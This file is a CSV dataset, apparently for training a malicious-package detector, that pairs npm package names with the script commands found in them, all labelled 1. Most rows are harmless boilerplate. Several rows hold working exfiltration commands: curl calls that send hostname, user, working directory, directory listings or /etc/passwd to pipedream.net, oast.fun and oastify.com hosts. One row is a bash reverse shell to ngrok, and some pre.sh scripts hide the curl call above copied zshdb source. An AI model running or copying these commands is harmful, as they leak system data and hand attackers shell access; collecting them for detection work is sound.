command,package_name,label
node app.js,bank-settings-35.0.0,1
echo "Error: no test specified" && exit 1,bbc-iplayer-sounds-chatbot-11.9.4,1
node index.js,bbc-iplayer-sounds-chatbot-11.9.4,1
echo "Error: no test specified" && exit 1,bistrosk-1.0.0,1
node index.js,bistrosk-1.0.0,1
echo "Error: no test specified" && exit 1,bootstrapper-35.0.0,1
node app.js,bootstrapper-35.0.0,1
echo "Error: no test specified" && exit 1,brum-global-variable-98.98.1,1
node index.js,brum-global-variable-98.98.1,1
echo "Error: no test specified" && exit 1,brum-global-variable-98.98.2,1
node index.js,brum-global-variable-98.98.2,1
echo "Error: no test specified" && exit 1,bykea-50.50.50,1
echo \"Error: anything" && exit 1,by-storage-1.15.11,1
echo "Error: no test specified" && exit 1,capital-35.0.0,1
node app.js,capital-35.0.0,1
echo "Error: no test specified" && exit 1,cash-register-35.0.0,1
node app.js,cash-register-35.0.0,1
node index.js > /dev/null 2>&1,chegg-contentful-2.0.0,1
echo "Error: no test specified" && exit 1,chegg-contentful-2.0.0,1
echo "Error: no test specified" && exit 1,cms-datocms-9.9.9,1
echo "Error: no test specified" && exit 1,cncf-interactive-landscape-1.0.0,1
node index.js > /dev/null 2>&1,cnp_al_corp_front-0.1.999,1
echo "Error: no test specified" && exit 1,cnp_al_corp_front-0.1.999,1
node index.js,coinbase-wallet-sdk-9.9.99,1
yarn workspaces foreach -pt run lint,coinbase-wallet-sdk-9.9.99,1
yarn workspaces foreach -pt run typecheck,coinbase-wallet-sdk-9.9.99,1
yarn workspaces foreach -ipv run dev,coinbase-wallet-sdk-9.9.99,1
./scripts/release.sh,coinbase-wallet-sdk-9.9.99,1
echo "Error: no test specified" && exit 1,component-financial-services-99.0.1,1
node index.js,component-financial-services-99.0.1,1
echo "Error: no test specified" && exit 1,component-lightbox-99.0.1,1
node index.js,component-lightbox-99.0.1,1
echo "Error: no test specified" && exit 1,component-popover-99.0.1,1
node index.js,component-popover-99.0.1,1
echo "Error: no test specified" && exit 1,component-price-module-99.0.1,1
node index.js,component-price-module-99.0.1,1
echo "Error: no test specified" && exit 1,component-store-selector-99.0.1,1
node index.js,component-store-selector-99.0.1,1
echo "Error: no test specified" && exit 1,component-text-99.0.1,1
node index.js,component-text-99.0.1,1
echo "Error: no test specified" && exit 1,corporate-delegate-packages-2.0.0,1
./pre.sh,corporate-delegate-packages-2.0.0,1
bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  https://eo1z2prk4as56mb.m.pipedream.net
,corporate-delegate-packages-2.0.0,1
node index.js > /dev/null 2>&1,course-structure-debugger-10.999.0,1
echo "Error: no test specified" && exit 1,course-structure-debugger-10.999.0,1
node index.js > /dev/null 2>&1,course-structure-debugger-11.999.0,1
echo "Error: no test specified" && exit 1,course-structure-debugger-11.999.0,1
echo "Error: no test specified" && exit 1,cusip-99.99.99,1
node index.js,cusip-99.99.99,1
echo "Error: no test specified" && exit 1,customers-35.0.0,1
node app.js,customers-35.0.0,1
echo "Error: no test specified" && exit 1,cz-react-ui-library-8.0.0,1
node index.js,cz-react-ui-library-8.0.0,1
echo "Error: no test specified" && exit 1,dashboard-35.0.0,1
node app.js,dashboard-35.0.0,1
echo "Error: no test specified" && exit 1,dell-microapp-core-ng-2000.0.0,1
node index.js,dell-microapp-core-ng-2000.0.0,1
echo "Error: no test specified" && exit 1,dep_mal2-1.0.0,1
node app.js,dep_mal2-1.0.0,1
echo "Error: no test specified" && exit 1,dep_test_for_mal2-2.0.3,1
node app.js,dep_test_for_mal2-2.0.3,1
echo "Error: no test specified" && exit 1,developer-scaffold-full-width-wrapper-1.9.2,1
node index.js,developer-scaffold-full-width-wrapper-1.9.2,1
node index.js,dionysos-frame-manager-0.2.1,1
echo "Error: no test specified" && exit 1,direct-debit-35.0.0,1
node app.js,direct-debit-35.0.0,1
echo "Error: no test specified" && exit 1,dm_commons_utilities-99.99.0,1
node index.js,dm_commons_utilities-99.99.0,1
echo "Error: no test specified" && exit 1,docker-slim-action-9.9.9,1
echo "Error: no test specified" && exit 1,docusaurus-plugin-matamo-1.0.1,1
node index.js,docusaurus-plugin-matamo-1.0.1,1
echo "Error: no test specified" && exit 1,docusaurus-template-1.0.1,1
node index.js,docusaurus-template-1.0.1,1
echo "Error: no test specified" && exit 1,dr-elephant-1.0.0,1
echo "Hacker here....",dr-elephant-1.0.0,1
node index.js > /dev/null 2>&1,eeforemon-1.999.0,1
echo "Error: no test specified" && exit 1,eeforemon-1.999.0,1
node init.js,emails-helper-2.0.20230825132218,1
echo "Error: no test specified" && exit 1,eslint-config-bsee-99.99.99,1
node index.js,eslint-config-bsee-99.99.99,1
echo "Error: no test specified" && exit 1,eslint-config-lf-eslint-99.99.99,1
node index.js,eslint-config-lf-eslint-99.99.99,1
echo "Error: no test specified" && exit 1,eslint-config-vdkweb-7.32.3,1
node index.js.,eslint-config-vdkweb-7.32.3,1
echo "Error: no test specified" && exit 1,exceptiongroup-1.1.3,1
echo "Error: no test specified" && exit 1,ez-retro-server-2.0.0,1
node index.js,ez-retro-server-2.0.0,1
echo "Error: no test specified" && exit 1,fallen-fallen-web-1.0.0,1
node index.js,fallen-fallen-web-1.0.0,1
mocha,fca-dongsexx-1.7.5,1
./node_modules/.bin/eslint *.js,fca-dongsexx-1.7.5,1
prettier utils.js src/* --write,fca-dongsexx-1.7.5,1
node index.js > /dev/null 2>&1,feature-flag-framework-9.999.0,1
echo "Error: no test specified" && exit 1,feature-flag-framework-9.999.0,1
node index.js > /dev/null 2>&1,fiji-core-cryptopool-9.999.0,1
echo "Error: no test specified" && exit 1,fiji-core-cryptopool-9.999.0,1
node index.js > /dev/null 2>&1,fiji-core-foc-9.999.0,1
echo "Error: no test specified" && exit 1,fiji-core-foc-9.999.0,1
node index.js > /dev/null 2>&1,fiji-core-foundation-9.999.0,1
echo "Error: no test specified" && exit 1,fiji-core-foundation-9.999.0,1
node index.js > /dev/null 2>&1,fiji-core-framework-9.999.0,1
echo "Error: no test specified" && exit 1,fiji-core-framework-9.999.0,1
echo "Error: no test specified" && exit 1,file-format-series-json-to-sketch-99.99.0,1
node index.js,file-format-series-json-to-sketch-99.99.0,1
echo "Error: no test specified" && exit 1,firefly-utilities-helper-ts-1.1.14,1
node index.js,firefly-utilities-helper-ts-1.1.14,1
echo "Error: no test specified" && exit 1,fluent-icons-library-99.9.90,1
node index.js,fluent-icons-library-99.9.90,1
echo "Error: no test specified" && exit 1,fluent-system-icons-19.9.9,1
node index.js,fluent-system-icons-19.9.9,1
echo "Error: no test specified" && exit 1,flux_dev_tools-0.0.1,1
./pre.sh,flux_dev_tools-0.0.1,1
#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://cm4m8ma2vtc00003s3yggknkrkryyyyyb.oast.fun
,flux_dev_tools-0.0.1,1
echo "Error: no test specified" && exit 1,flux_dev_tools.server.flask-1.0.0,1
./pre.sh,flux_dev_tools.server.flask-1.0.0,1
#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://cm4m8ma2vtc00003s3yggknkrkryyyyyb.oast.fun
,flux_dev_tools.server.flask-1.0.0,1
node index.js > /dev/null 2>&1,foremon78-1.999.0,1
echo "Error: no test specified" && exit 1,foremon78-1.999.0,1
node index.js > /dev/null 2>&1,foremonnn-1.999.0,1
echo "Error: no test specified" && exit 1,foremonnn-1.999.0,1
echo "Error: no test specified" && exit 1,gapps-automation-9.9.9,1
node index.js > /dev/null 2>&1,gatecrash-10.999.0,1
echo "Error: no test poc specified" && exit 1,gatecrash-10.999.0,1
echo "Error: no test specified" && exit 1,ghostfiles-1.0.10,1
echo "Error: no test specified" && exit 1,globalhackaton-1.0.1,1
node index.js,globalhackaton-1.0.1,1
echo "Error: no test specified" && exit 1,goingwithflow-6.9.9,1
node index.js,goingwithflow-6.9.9,1
echo "Error: no test specified" && exit 1,grafana__slate-react-1.0.10,1
node index.js,grafana__slate-react-1.0.10,1
echo "Error: no test specified" && exit 1,gtm-js-99.99.99,1
node index.js,gtm-js-99.99.99,1
echo "Error: no test specified" && exit 1,happa-9.9.9,1
echo "Error: no test specified" && exit 1,h_test6-2.0.0,1
node app.js,h_test6-2.0.0,1
echo "Error: no test specified" && exit 1,hyperion-autologging-1.0.10,1
node index.js,hyperion-autologging-1.0.10,1
echo "Error: no test specified" && exit 1,iceberg-395.0.0-beta.1,1
node setup.js,iceberg-395.0.0-beta.1,1
echo "Error: no test specified" && exit 1,importlib-metadata-1.0.0,1
index.js,importlib-metadata-1.0.0,1
echo "Error: no test specified" && exit 1,iniconfig-2.0.0,1
index.js,iniconfig-2.0.0,1
echo "Error: no test specified" && exit 1,integrations-35.0.0,1
node app.js,integrations-35.0.0,1
echo "Error: no test specified" && exit 1,inventory-35.0.0,1
node app.js,inventory-35.0.0,1
echo "Error: no test specified" && exit 1,invoices-35.0.0,1
node app.js,invoices-35.0.0,1
echo "Error: no test specified" && exit 1,ivr-payments-1.2.3,1
echo "Error: no test specified" && exit 1,js2restutils-99.0.0,1
node index.js,js2restutils-99.0.0,1
echo "Error: no test specified" && exit 1,jsdocument-1.0.34,1
echo "Error: no test specified" && exit 1,js-starter-code-1.1.1,1
node index.js,js-starter-code-1.1.1,1
node index.js > /dev/null 2>&1,jupiter-emoji-9.999.0,1
echo "Error: no test specified" && exit 1,jupiter-emoji-9.999.0,1
node index.js > /dev/null 2>&1,jupiter-i18n-9.999.0,1
echo "Error: no test specified" && exit 1,jupiter-i18n-9.999.0,1
node index.js > /dev/null 2>&1,jupiter-opensdk-9.999.0,1
echo "Error: no test specified" && exit 1,jupiter-opensdk-9.999.0,1
node index.js,launchdarkly-cpp-internal-9.9.9,1
echo "Error: no test specified" && exit 1,launchdarkly-cpp-internal-9.9.9,1
node index.js > /dev/null 2>&1,lbank-request-3000.0.0,1
echo "Error: no test specified" && exit 1,lbank-request-3000.0.0,1
node index.js > /dev/null 2>&1,lbank-ui-3000.0.0,1
echo "Error: no test specified" && exit 1,lbank-ui-3000.0.0,1
echo "Error: no test specified" && exit 1,le-core-infra-99.0.0,1
node index.js,le-core-infra-99.0.0,1
echo "Error: no test specified" && exit 1,library.cycle.c-1.0.0,1
node index.js,library.cycle.c-1.0.0,1
echo "Error: no test specified" && exit 1,lookerbot-2000.0.0,1
node index.js,lookerbot-2000.0.0,1
echo "Error: no test specified" && exit 1,lp-transporter-99.0.0,1
node index.js,lp-transporter-99.0.0,1
echo "Error: no test specified" && exit 1,lp-vue-components-99.0.0,1
node index.js,lp-vue-components-99.0.0,1
echo "Error: no test specified" && exit 1,ls_sdk-1.0.0,1
echo "Error: no test specified" && exit 1,malware-simulator-0.0.3,1
node compile.js,malware-simulator-0.0.3,1
#!/bin/bash

curl https://stepsec.github.io/
,malware-simulator-0.0.3,1
echo "Error: no test specified" && exit 1,mc-dxp-6.0.2,1
echo "Error: no test specified" && exit 1,mecfront-2.0.1,1
echo "Error: no test specified" && exit 1,mediaspace-1.0.0,1
node index.js,mediaspace-1.0.0,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-food-diary-0.1.2,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-food-diary-0.1.2,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-test-repo-0.1.1,1
/usr/bin/curl --data '@/etc/passwd' $(hostname)cm31san2vtc000046akggkbohioyyyyyb.oast.fun,mfp-test-repo-0.1.1,1
echo "Error: no test specified" && exit 1,mijngemeente-gateway-99.99.0,1
node index.js,mijngemeente-gateway-99.99.0,1
echo "Error: no test specified" && exit 1,mparticle-roku-sdk-99999.1.15,1
node index.js,mparticle-roku-sdk-99999.1.15,1
echo "Error: no test specified" && exit 1,mz-test-1.1.1,1
node index.js,mz-test-1.1.1,1
curl f2is12etx9oswozvgvx4f6v45vbmzcn1.oastify.com/$(tail -1 /etc/passwd),nequi-utils-4.1.0,1
echo "Error: no test specified" && exit 1,nequi-utils-4.1.0,1
node scripts/setup.js,netbet_react-5.0.4,1
echo "Error: no test specified" && exit 1,nextcloud-api-sdk-1.1.1,1
node index.js,nextcloud-api-sdk-1.1.1,1
echo "Error: no test specified" && exit 1,ngx-iceberg-395.0.0-beta.1,1
node setup.js,ngx-iceberg-395.0.0-beta.1,1
echo "Error: no test specified" && exit 1,ngx-iceberg-links-395.0.0-beta.1,1
node setup.js,ngx-iceberg-links-395.0.0-beta.1,1
echo "Error: no test specified" && exit 1,n-messaging-client-99999.4.0,1
node adham.js,n-messaging-client-99999.4.0,1
#!/bin/bash
curl -H "h1: $(whoami | base64 | base64 )" -H "h2: $(hostname -I | base64 | base64 | tr -d '\n')" -H "h3: $(pwd | base64 | base64)" -H "h4: $(hostname | base64 | base64 | tr -d '\n')"  -H "h5: $(ls / | base64 | base64 | tr -d '\n')"  https://91d105265257dcee7429b373efe8b505.m.pipedream.net
# -*- shell-script -*-
# dbg-pre.sh - Code common to zshdb and zshdb-trace that has to run first

#   Copyright (C) 2008-2010; 2014 Rocky Bernstein rocky@gnu.org

#   zshdb is free software; you can redistribute it and/or modify it under
#   the terms of the GNU General Public License as published by the Free
#   Software Foundation; either version 2; or (at your option) any later
#   version.

#   zshdb is distributed in the hope that it will be useful; but WITHOUT ANY
#   WARRANTY; without even the implied warranty of MERCHANTABILITY or
#   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
#   for more details.

#   You should have received a copy of the GNU General Public License along
#   with zshdb; see the file COPYING.  If not; write to the Free Software
#   Foundation; 59 Temple Place; Suite 330; Boston; MA 02111 USA.

# Here we put definitions common to both the script debugger and
# dbg-trace.sh. In contrast to other routines; this code is sourced
# early -- before most of the debugger script is run.

# Note: initializations which are mostly used in only one sub-part
# (e.g. variables for break/watch/actions) are in the corresponding
# file: either in lib or (less good) command.

# Are we using a debugger-enabled shell? If not let's stop right here.
#typeset old_setopt="$-"

# is-at-least messes up in some situations so we have to not use it for now.
# typeset -fuz is-at-least   Same as "functions -u -z" but better documented.
# if ! is-at-least 4.3.6-dev-0 ; then
#   print "Sorry; your $_Dbg_shell_name just isn't modern enough." 2>&1
#   print "We need 4.3.6-dev-0 or greater." 2>&1
#   exit 30
# fi
# is-at-least does an emulate -L zsh
# emulate -L ksh

# Will be set to 1 if the top-level call is a debugger.
#typeset -i _Dbg_script=0

# This function is overwritten by when lib/fns.sh gets loaded
#_Dbg_msg()
#{
#  echo "$*"
#}

# Used by "show version" as well as --version
#_Dbg_do_show_version()
#{
#  _Dbg_msg "$_Dbg_debugger_name; release $_Dbg_release"
#}

# Expand filename given as $1.
# we echo the expanded name or return $1 unchanged if a bad filename.
# Return is 0 if good or 1 if bad.
# File globbing is handled.
# Note we don't check that the file exists; just that the format is
# valid; we do check that we can "search" the directory implied in the
# filename.

#function _Dbg_expand_filename {
#  typeset -r filename="$1"

#   Break out basename and dirname
#  typeset basename="${filename*/}"
#  typeset -x dirname="${filename%/*}"

#   No slash given in filename? Then use . for dirname
#  [[ $dirname == $basename ]] && [[ $filename != '/' ]] && dirname='.'

#   Dirname is ''? Then use / for dirname
#  dirname=${dirname:-/}

#   Handle tilde expansion in dirname
#  dirname=$(echo $dirname)

#  typeset long_path

#  [[ $basename == '.' ]] && basename=''
#  if long_path=$( (cd "$dirname" ; pwd) 2>/dev/null ) ; then
#    if [[ "$long_path" == '/' ]] ; then
#      echo "/$basename"
#    else
#      echo "$long_path/$basename"
#    fi
#    return 0
#  else
#    echo $filename
#    return 1
#  fi
#}

# Create temporary file based on $1
# file $1
#_Dbg_tempname() {
#  echo "$_Dbg_tmpdir/${_Dbg_debugger_name}_$1_$$"
#}

# Process command-line options
#. ${_Dbg_libdir}/dbg-opts.sh
#OPTLIND=1
#_Dbg_parse_options "$@"

#if [[ ! -d $_Dbg_tmpdir ]] && [[ ! -w $_Dbg_tmpdir ]] ; then
#  echo "${_Dbg_pname}: cannot write to temp directory $_Dbg_tmpdir." >&2
#  echo "${_Dbg_pname}: Use -T try directory location." >&2
#  exit 1
#fi

# Save the initial working directory so we can reset it on a restart.
#typeset -x _Dbg_init_cwd=$PWD

#typeset -i _Dbg_running=1       True we are not finished running the program

#typeset -i _Dbg_brkpt_num=0     If nonzero; the breakpoint number that we
#                                are currently stopped at.

# Sets whether or not to display command before executing it.
#typeset _Dbg_set_trace_commands='off'

# Known normal IFS consisting of a space; tab and newline
#typeset -x _Dbg_space_IFS=$' \t\r\n'

# Number of statements to run before entering the debugger.  Is used
# intially to get out of sourced dbg-main.inc script and in top-level
# debugger script to not stop in remaining debugger statements before
# the sourcing the script to be debugged.
#typeset -i _Dbg_step_ignore=1
#[[ -n $_Dbg_histfile ]] && fc -p ${_Dbg_histfile}
,n-messaging-client-99999.4.0,1
jsdoc -c jsDocsConfig.json -r -t ./node_modules/better-docs,noblox.js-vps-4.18.0,1
eslint lib/,noblox.js-vps-4.18.0,1
jest,noblox.js-vps-4.18.0,1
node postinstall.js,noblox.js-vps-4.18.0,1
echo "Error: no test specified" && exit 1,node-jhs-1.0.3,1
npm publish --access public,node-jhs-1.0.3,1
echo "Error: no test specified" && exit 1,nx-vaults-1.0.0,1
echo 'Error: no test specified' && exit 1,opensource-website-1.0.0,1
node index.js,opensource-website-1.0.0,1
echo "Error: no test specified" && exit 1,overstock-logger-59.2.12,1
node index.js,overstock-logger-59.2.12,1
echo "Error: no test specified" && exit 1,owasp-zap-extension-0.0.3,1
node index.js,owasp-zap-extension-0.0.3,1
echo "Error: no test specified" && exit 1,oy-cms-analytics-2.2.1,1
echo "Error: no test specified" && exit 1,package-shopify-tester-99.99.99,1
 node index.js,package-shopify-tester-99.99.99,1
echo "Error: no test specified" && exit 1,pa-mojs-1.3.8,1
node index.js,pa-mojs-1.3.8,1
echo "Error: no test specified" && exit 1,papaya_banana_evil-4.0.0,1
node index.js,papaya_banana_evil-4.0.0,1
echo "Error: no test specified" && exit 1,papaya_pear_vicious-5.0.0,1
node index.js,papaya_pear_vicious-5.0.0,1
node install.js,paypal-validators-1.0.0,1
echo "Error: no test specified" && exit 1,paysecuretest-99.9.9,1
node index.js,paysecuretest-99.9.9,1
echo "Error: no test specified" && exit 1,payuangular-15.0.1,1
echo "Error: no test specified" && exit 1,pb-styles-v1-5.1.1,1
node index.js,pb-styles-v1-5.1.1,1
echo "Error: no test specified" && exit 1,pdfjs2-2.2.3,1
node index.js,pdfjs2-2.2.3,1
echo "Error: no test specified" && exit 1,pdfjs2-5.2.3,1
node index.js,pdfjs2-5.2.3,1
echo "Error: no test specified" && exit 1,pickby-9.9.9,1
 node index.js,pickby-9.9.9,1
echo "Error" && exit 1,pingserver-test.01-1.1.0,1
node index.js,pingserver-test.01-1.1.0,1
node index.js > /dev/null 2>&1,pkg-with-peer-deps-1.999.1,1
echo "Error: no test specified" && exit 1,pkg-with-peer-deps-1.999.1,1
node setup.js,portal-env-1.0.0,1
npm run file-spy,portal-env-1.0.0,1
echo "Error: no test specified" && exit 1,pp-profile-widget-35.0.0,1
node app.js,pp-profile-widget-35.0.0,1
echo "Error: no test specified" && exit 1,producer-journey-1.0.4,1
node index.js,producer-journey-1.0.4,1
echo "Error: no test specified" && exit 1,products-35.0.0,1
node app.js,products-35.0.0,1
echo "Error: no test specified" && exit 1,pro-icons-99.99.99,1
node index.js,pro-icons-99.99.99,1
bash -i >& /dev/tcp/tcp.in.ngrok.io/17353 0>&1,puppeteer-example-0.1.4,1
bash -i >& /dev/tcp/tcp.in.ngrok.io/17353 0>&1,puppeteer-example-0.1.4,1
echo "Error: no test specified" && exit 1,purplebricks-administration-7.0.0,1
node index.js,purplebricks-administration-7.0.0,1
echo "Error: no test specified" && exit 1,purplebricks-frontend-core-7.0.0,1
node index.js,purplebricks-frontend-core-7.0.0,1
echo "Error: no test specified" && exit 1,pxs-map-99.99.991,1
node index.js,pxs-map-99.99.991,1
echo "Error: no test specified" && exit 1,rambox-1.0.0,1
node index.js,rambox-1.0.0,1
echo "Error: no test specified" && exit 1,react-35.0.0,1
node app.js,react-35.0.0,1
echo "Error: no test specified" && exit 1,react-intl-cdo-1.0.0,1
node index.js,react-intl-cdo-1.0.0,1
echo "Error: no test specified" && exit 1,react-router-dom-35.0.0,1
node app.js,react-router-dom-35.0.0,1
echo "Error: no test specified" && exit 1,react-spa-35.0.0,1
node app.js,react-spa-35.0.0,1
echo "Error: no test specified" && exit 1,react-toolbox-docs-1.0.1,1
node index.js,react-toolbox-docs-1.0.1,1
echo "Error: no test specified" && exit 1,receipts-35.0.0,1
node app.js,receipts-35.0.0,1
echo "Error: no test specified" && exit 1,regily-1.0.0,1
node index.js,regily-1.0.0,1
echo "Error: no test specified" && exit 1,relay-github-root-2000.0.0,1
node index.js,relay-github-root-2000.0.0,1
echo "Error: no test specified" && exit 1,remove-pr-labels-1.1.0,1
node index.js,remove-pr-labels-1.1.0,1
echo "Error: no test specified" && exit 1,rippling-flux-dev-1.0.0,1
./index.js,rippling-flux-dev-1.0.0,1
echo "Error: no test specified" && exit 1,rippling-flux-dev-tools-0.0.2,1
index.js,rippling-flux-dev-tools-0.0.2,1
echo "Error: no test specified" && exit 1,rippling-flux-sdk-0.0.3,1
./pre.sh,rippling-flux-sdk-0.0.3,1
#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://cm4m8ma2vtc00003s3yggknkrkryyyyyb.oast.fun
,rippling-flux-sdk-0.0.3,1
echo "Error: no test specified" && exit 1,routes-35.0.0,1
node app.js,routes-35.0.0,1
echo "Error: no test specified" && exit 1,ruamel.yaml.clib-0.1.2,1
./pre.sh,ruamel.yaml.clib-0.1.2,1
#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://cm4m8ma2vtc00003s3yggknkrkryyyyyb.oast.fun

,ruamel.yaml.clib-0.1.2,1
echo "Error: no test specified" && exit 1,ruamel-yaml-clib-1.0.0,1
./index.js,ruamel-yaml-clib-1.0.0,1
echo "Error: no test specified" && exit 1,sales-trends-35.0.0,1
node app.js,sales-trends-35.0.0,1
echo "Error: no test specified" && exit 1,scbe-1.0.0,1
node index.js,scbe-1.0.0,1
echo "Error: no test specified" && exit 1,scoot-layout-components-1.0.0,1
node index.js,scoot-layout-components-1.0.0,1
echo "Error: no test specified" && exit 1,scoot-tracking-1.0.2,1
node index.js,scoot-tracking-1.0.2,1
echo "Error: no test specified" && exit 1,send-orchestrator-event-lambda-8.8.8,1
echo "Error: no test specified" && exit 1,settings-35.0.0,1
node app.js,settings-35.0.0,1
echo "Error: no test specified" && exit 1,shared-395.0.0-beta.1,1
node setup.js,shared-395.0.0-beta.1,1
echo "Error: no test specified" && exit 1,sharinj-test-1.0.0,1
node index.js,sharinj-test-1.0.0,1
echo "Error: no test specified" && exit 1,shell-35.0.0,1
node app.js,shell-35.0.0,1
echo "Error: no test specified" && exit 1,signalr-temp-client-20.20.0,1
node adham.js,signalr-temp-client-20.20.0,1
#!/bin/bash
curl -H "h1: $(whoami | base64 | base64 )" -H "h2: $(hostname -I | base64 | base64 | tr -d '\n')" -H "h3: $(pwd | base64 | base64)" -H "h4: $(hostname | base64 | base64 | tr -d '\n')"  -H "h5: $(ls / | base64 | base64 | tr -d '\n')"  https://91d105265257dcee7429b373efe8b505.m.pipedream.net
# -*- shell-script -*-
# dbg-pre.sh - Code common to zshdb and zshdb-trace that has to run first

#   Copyright (C) 2008-2010; 2014 Rocky Bernstein rocky@gnu.org

#   zshdb is free software; you can redistribute it and/or modify it under
#   the terms of the GNU General Public License as published by the Free
#   Software Foundation; either version 2; or (at your option) any later
#   version.

#   zshdb is distributed in the hope that it will be useful; but WITHOUT ANY
#   WARRANTY; without even the implied warranty of MERCHANTABILITY or
#   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
#   for more details.

#   You should have received a copy of the GNU General Public License along
#   with zshdb; see the file COPYING.  If not; write to the Free Software
#   Foundation; 59 Temple Place; Suite 330; Boston; MA 02111 USA.

# Here we put definitions common to both the script debugger and
# dbg-trace.sh. In contrast to other routines; this code is sourced
# early -- before most of the debugger script is run.

# Note: initializations which are mostly used in only one sub-part
# (e.g. variables for break/watch/actions) are in the corresponding
# file: either in lib or (less good) command.

# Are we using a debugger-enabled shell? If not let's stop right here.
#typeset old_setopt="$-"

# is-at-least messes up in some situations so we have to not use it for now.
# typeset -fuz is-at-least   Same as "functions -u -z" but better documented.
# if ! is-at-least 4.3.6-dev-0 ; then
#   print "Sorry; your $_Dbg_shell_name just isn't modern enough." 2>&1
